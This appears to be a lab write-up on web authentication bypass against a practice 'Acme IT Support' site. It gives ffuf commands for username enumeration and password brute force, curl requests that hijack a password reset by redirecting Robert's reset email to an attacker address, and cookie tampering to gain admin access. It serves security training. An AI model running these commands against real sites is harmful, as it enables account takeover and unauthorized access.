
# Authentication Bypass

Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.

## Username Enumeration
A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.



Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (http://10.10.199.1/customers/signup) signup page.



If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.

`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.199.1/customers/signup -mr "username already exists"`

The `-X` argument specifies the request method, this will be a GET request by default

The `-d` argument specifies the data that we are going to send.

The `-H` argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data.

`-mr` argument is the text on the page we are looking for to validate we've found a valid username.

Create a file called valid_usernames.txt and add the usernames that you found using ffuf.

## Brute Force

Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (http://10.10.199.1/customers/login).

`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.199.1/customers/login -fc 200`

`-fc` argument to check for an HTTP status code other than 200.

## Logic Flaw

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

* Logic Flaw Example

```PHP
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

* Logic Flaw Practical

We're going to examine the Reset Password function of the Acme IT Support website (http://10.10.199.1/customers/reset).

` curl 'http://10.10.199.1/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'`

OUTPUT : We'll send you a reset email to `robert@acmeitsupport.thm`

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

`curl 'http://10.10.199.1/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`

OUTPUT : We'll send you a reset email to `attacker@hacker.com`

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of {username}@customer.acmeitsupport.thm

Now rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

`curl 'http://10.10.199.1/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`

## Cookie Tampering

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

* Plain Text

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

` Set-Cookie: logged_in=true; Max-Age=3600; Path=/`

` Set-Cookie: admin=false; Max-Age=3600; Path=/`

First, we'll start just by requesting the target page:

`curl http://10.10.234.247/cookie-test`

We can see we are returned a message of: Not Logged In

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:

`curl -H "Cookie: logged_in=true; admin=false" http://10.10.234.247/cookie-test`

We are given the message: Logged In As A User

Finally, we'll send one last request setting both the logged_in and admin cookie to true:

`curl -H "Cookie: logged_in=true; admin=true" http://10.10.234.247/cookie-test`

This returns the result: Logged In As An Admin

* Hashing

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text.

* Encoding

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

Take the below data as an example which is set by the web server upon logging in:

`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`

This string base64 decoded has the value of `{"id":1,"admin": false}` we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.










